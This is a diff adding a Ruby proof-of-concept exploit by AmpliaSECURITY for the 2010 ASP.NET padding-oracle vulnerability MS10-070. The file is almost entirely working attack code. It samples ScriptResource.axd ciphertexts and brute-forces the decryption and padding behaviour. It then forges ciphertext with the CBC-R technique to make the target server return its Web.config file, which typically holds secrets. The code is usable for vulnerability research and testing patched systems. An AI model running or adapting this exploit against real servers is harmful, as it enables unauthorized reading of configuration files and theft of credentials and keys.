@@ -1,0 +1,470 @@
+#!/usr/bin/ruby -w
+
+#
+#  aspx_ad_chotext_attack.rb
+#
+#  Copyright (c) 2010 AmpliaSECURITY. All rights reserved
+#
+#  http://www.ampliasecurity.com
+#  Agustin Azubel - aazubel@ampliasecurity.com
+#
+#
+#  MS10-070 ASPX proof of concept
+#    Decrypt data using an auto decryptor bundled in the aspx framework
+#    Encrypt data using Rizzo-Duong CBC-R technique
+#
+# Copyright (c) 2010 Amplia Security. All rights reserved.
+#
+# Unless you have express writen permission from the Copyright
+# Holder, any use of or distribution of this software or portions of it,
+# including, but not limited to, reimplementations, modifications and derived
+# work of it, in either source code or any other form, as well as any other
+# software using or referencing it in any way, may NOT be sold for commercial
+# gain, must be covered by this very same license, and must retain this
+# copyright notice and this license.
+# Neither the name of the Copyright Holder nor the names of its contributors
+# may be used to endorse or promote products derived from this software
+# without specific prior written permission.
+#
+#
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
+# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+# POSSIBILITY OF SUCH DAMAGE.
+#
+
+
+require 'net/http'
+require 'uri'
+require 'rexml/document'
+
+
+$debugging = false
+
+
+
+module XArray
+  def hex_inspect
+    "[#{length}][ #{map { |x| x.hex_inspect }.join ", " } ]"
+  end
+end
+
+class Array
+  include XArray
+end
+
+
+
+
+require 'base64'
+
+class XBase64
+  def self.encode s
+    s = Base64.encode64 s
+    s = s.gsub '+', '-'
+    s = s.gsub '/', '_'
+    s = s.gsub "\n", ''
+    s = s.gsub "\r", ''
+
+    s = XBase64.encode_base64_padding s
+  end
+
+  def self.encode_base64_padding s
+    padding_length = 0
+    padding_length += 1 while s[-1 - padding_length, 1] == "="
+    s[0..(-1 - padding_length)] + padding_length.to_s
+  end
+
+
+  def self.decode s
+    s = s.gsub '-', '+'
+    s = s.gsub '_', '/'
+
+    s = self.decode_base64_padding s
+
+    Base64.decode64 s
+  end
+
+  def self.decode_base64_padding s
+    padding_length = s[-1,1].to_i
+    s[0...-1] + ("=" * padding_length)
+  end
+end
+
+
+module XString
+  def xor other
+    raise RuntimeError, "length mismatch" if self.length != other.length
+    (0...length).map { |i| self[i] ^ other[i] }.map { |x| x.chr }.join
+  end
+  alias ^ :xor
+
+  def hex_inspect
+    printables = [ "\a", "\b", "\e", "\f", "\n", "\r", "\t", "\v" ] + \
+                 (0x20..0x7e).entries
+
+    "[#{length}]" + "\"#{unpack("C*").map { |x|
+                      printables.include?(x) ? x.chr : "\\x%02x" % x }.join}\""
+  end
+
+  def to_blocks blocksize
+    (0...length/blocksize).map { |i| self[blocksize * i, blocksize]}
+  end
+end
+
+class String
+  include XString
+end
+
+
+
+class ASPXAutoDecryptorChosenCiphertextAttack
+  attr_reader :uri
+  attr_reader :filename
+  attr_reader :min_filelength
+  attr_reader :filere
+  attr_reader :http
+  attr_reader :d_value
+  attr_reader :blocksize
+  attr_reader :padding_length
+  attr_reader :decrypt_command_mask
+  attr_reader :axdpath
+  attr_reader :axdname
+  attr_reader :base_mask
+  
+  def initialize parameters
+    @uri = URI.parse parameters[:uri]
+    @filename = parameters[:filename]
+    @min_filelength = parameters[:min_filelength]
+    @filere = parameters[:filere]
+    @http = http_initialize
+    @d_value = nil
+    @base_mask = rand 0xffff
+    @decrypt_command_mask = nil
+    @blocksize = nil
+    @padding_length = nil
+    @axdpath = nil
+    @axdname = nil
+    
+    puts "target: #{@uri}"
+    puts "base_mask: 0x%04x" % @base_mask
+  end
+
+  def http_initialize
+    http = Net::HTTP.new @uri.host, @uri.port
+    http.start
+    http
+  end
+
+
+  def parse_script_tag xml, re
+    d = nil
+
+    doc = REXML::Document.new xml
+    doc.elements.each 'script' do |e|
+      src_attribute = e.attributes['src']
+      md = re.match src_attribute
+      d = md[1]
+      break
+    end
+
+    raise RuntimeError, "could not parse script_tag" unless d
+
+    d
+  end  
+  private :parse_script_tag
+  
+  def get_ciphertext_sample
+    [ [ "ScriptResource.axd", /\/ScriptResource\.axd\?d=([a-zA-Z0-9\-\_]+)\&t=[a-z0-9]+/ ],
+    ].each do |name, re|
+
+        headers = { 'User-Agent' => \
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)' }
+
+        response = http.get uri.path, headers
+        body = response.body
+
+        script_tags = body.lines.select { |x| x.index name }
+
+        next if script_tags.empty?
+
+        puts "script tags using #{name} [#{script_tags.length}]:"
+        puts script_tags.map { |x| "\t#{x}" }
+
+        d = parse_script_tag script_tags[0], re
+
+        puts "using script: #{name}"
+        puts "using d_value: #{d}"
+
+        @axdpath = uri.path[0, uri.path.rindex('/')]
+        @axdname = name
+        @d_value = ("\x00" * 16) + (XBase64.decode d)
+        break
+    end
+
+    raise RuntimeError, "could not find any axd sample" unless d_value
+
+    d_value
+  end
+
+  def parse_html_body h, body
+    parsed = String.new
+    
+    doc = REXML::Document.new body
+    doc.elements.each h do |e|
+      parsed = e.text
+      break
+    end
+    
+    parsed
+  end
+
+  def send_request d
+    request = Net::HTTP::Get.new "/#{axdpath}/#{axdname}?d=#{XBase64.encode d}"
+    request['Connection'] = 'Keep-Alive'
+    @http.request request
+  end
+  
+  def decrypt d
+    ciphertext = d.clone
+    ciphertext[0, 2] = [ @decrypt_command_mask ].pack "S"
+
+    response = send_request ciphertext
+
+    parse_html_body 'html/head/title', response.body
+  end
+  
+  def discover_decrypt_command
+    puts "discovering decrypt command..."
+
+    ciphertext = d_value.clone
+    1.upto 0xffff do |mask|
+      ciphertext[0, 2] = [ base_mask + mask ].pack "S"
+      
+      response = send_request ciphertext
+
+      print "\rtrying decrypt_mask: 0x%04x/0xffff, http_code: %4d, body_length: %5d" % \
+                                     [ mask,                   response.code,   response.body.length ]
+
+      next unless response.code == "200"
+
+      begin
+        puts parse_html_body 'html/head/title', response.body
+        @decrypt_command_mask = base_mask + mask
+      rescue Exception => e
+        puts e
+        puts "exception !"
+        next
+      end
+
+      break
+    end
+    
+    puts
+    
+    raise RuntimeError, "no more combinations to try !" unless decrypt_command_mask
+    puts "decrypted !!!"
+    
+    decrypt_command_mask
+  end
+
+
+
+  def discover_blocksize_and_padding_length
+    puts "discovering blocksize and padding length..."
+
+    [ 16, 8 ].each do |b|
+      0.upto b - 1 do |i|
+        ciphertext = @d_value.clone
+        ciphertext[-(b * 2) + i] ^= 0x01
+        begin
+          decrypt ciphertext
+        rescue Exception => e
+          @blocksize = b
+          @padding_length = blocksize - i
+          break
+        end
+      end
+      break if blocksize
+    end
+
+    raise RuntimeError, "no more combinations to try !" unless blocksize
+
+    puts "discovered padding length: #{padding_length}"
+    puts "discovered blocksize: #{blocksize}"
+    
+    [ blocksize, padding_length]
+  end
+
+  def reallocate_cipher_blocks cipher_blocks, new_plaintext_blocks
+    puts "cipher_blocks.count: #{cipher_blocks.count}"
+
+    required_block_count = 1 + new_plaintext_blocks.count + 1
+    puts "required_block_count: #{required_block_count}"
+    
+    if required_block_count < cipher_blocks.count then
+      delta = cipher_blocks.count - required_block_count
+      puts "removing #{delta} extra blocks..."
+      cipher_blocks = [ cipher_blocks[0] ] + cipher_blocks[-required_block_count+1..-1]
+    elsif required_block_count > cipher_blocks.count then
+      delta = required_block_count - cipher_blocks.count
+      puts "adding #{delta} extra_blocks..."
+      cipher_blocks = [ cipher_blocks[0], ("\x00" * blocksize) * delta ] + cipher_blocks[1..-1]
+    end
+
+    puts "cipher_blocks.count: #{cipher_blocks.count}"
+
+    cipher_blocks
+  end
+  private :reallocate_cipher_blocks
+
+  def generate_new_plaintext_blocks
+    tail_padding = "\x01"
+    head_padding_length = blocksize - ( (@filename.length + tail_padding.length) % blocksize)
+    head_padding_length = 0 if head_padding_length == blocksize
+    head_padding = "\x00" * head_padding_length
+    new_plaintext = head_padding + @filename + tail_padding
+
+    new_plaintext.to_blocks blocksize
+  end
+  private :generate_new_plaintext_blocks
+
+  def encrypt
+    puts "encrypting \"#{@filename.hex_inspect}..."
+
+    new_plaintext_blocks = generate_new_plaintext_blocks
+
+    cipher_blocks = @d_value.to_blocks blocksize
+    cipher_blocks = reallocate_cipher_blocks cipher_blocks, new_plaintext_blocks
+
+    (1..new_plaintext_blocks.count).each do |i|
+      puts "round #{i} of #{new_plaintext_blocks.count}"
+      
+      new_plaintext_block = new_plaintext_blocks[-i]
+
+      old_cleartext = decrypt cipher_blocks.join
+      old_plaintext = old_cleartext + (padding_length.chr * padding_length)
+      puts "old_plaintext: #{old_plaintext.hex_inspect}"
+
+      old_plaintext_blocks = old_plaintext[blocksize * (-i - 1)..-1].to_blocks blocksize
+
+      old_plaintext_block = old_plaintext_blocks[-i]
+
+      normalization_table = old_plaintext_block.bytes.map { |x| x >= 0x80 or x == 0x0a }
+      if normalization_table.include? true
+        j = blocksize - (normalization_table.rindex true)
+        cipher_blocks[-1 - i][-j] ^= old_plaintext_block[-j]
+        puts "normalization needed for \"\\x%x\", j: %d !" % [ old_plaintext_block[-j], -j]
+        redo
+      end
+
+      cipher_blocks[-1 - i] ^= old_plaintext_block ^ new_plaintext_block
+
+      @padding_length = 1 if i == 1
+    end
+
+    cleartext = decrypt cipher_blocks.join
+    puts "new cleartext: #{cleartext.hex_inspect}"
+    
+#    raise RuntimeError, "too many \"|\" characters!" if cleartext.count("|") > 3
+
+    @d_value = cipher_blocks.join
+  end
+
+  def discover_escape_sequence
+    puts "discovering escape sequence..."
+
+    escape_sequence_mask = nil
+
+    offset = base_mask % (blocksize - 4)
+
+    ciphertext = d_value.clone
+    0x1ffff.times do |mask|
+      ciphertext[offset, 4] = [ base_mask + mask ].pack "L"
+
+      response = send_request ciphertext
+      print "\rtrying escape_mask: 0x%04x/0x1ffff, http_code: %4d, body_length: %5d" % \
+                                 [   mask,                   response.code,    response.body.length ]
+
+      next unless response.code == "200"
+      
+      next if min_filelength and (response.body.length < min_filelength)
+
+      next if filere and (not filere =~ response.body)
+      
+      escape_sequence_mask = base_mask + mask
+
+      puts
+      puts "found!"
+
+      unless $debugging
+        puts "press any key to show the contents of the file"
+        $stdin.gets
+      end
+      
+      puts response.body
+      break
+    end
+    puts
+
+    raise RuntimeError, "no more combinations to try !" unless escape_sequence_mask
+
+    escape_sequence_mask
+  end
+
+  def pause
+    return if $debugging
+    puts
+    puts "press any key to start the attack"
+    $stdin.gets
+  end
+
+  def run
+    get_ciphertext_sample
+    pause
+    discover_decrypt_command
+    discover_blocksize_and_padding_length
+    encrypt
+    discover_escape_sequence
+  end
+end
+
+
+
+puts [ "-------------------------------------------",
+       "aspx_ad_chotext_attack.rb",
+       "(c) 2010 AmpliaSECURITY",
+       "http://www.ampliasecurity.com",
+       "Agustin Azubel - aazubel@ampliasecurity.com",
+       "-------------------------------------------",
+       "\n" ].join "\n"
+
+
+
+if ARGV.length != 1 then
+  $stderr.puts "usage: ruby #{$PROGRAM_NAME} http://192.168.1.1/Default.aspx"
+  exit
+end
+
+begin
+  parameters = {
+    :uri => ARGV.first,
+    :filename => "|||~/Web.config",
+#    :min_filelength => 3000,
+    :filere => /configuration/
+  }
+
+  x = ASPXAutoDecryptorChosenCiphertextAttack.new parameters
+  x.run
+rescue Exception => e
+  $stderr.puts "Exploit failed: #{e}"
+  
+  raise if $debugging
+end
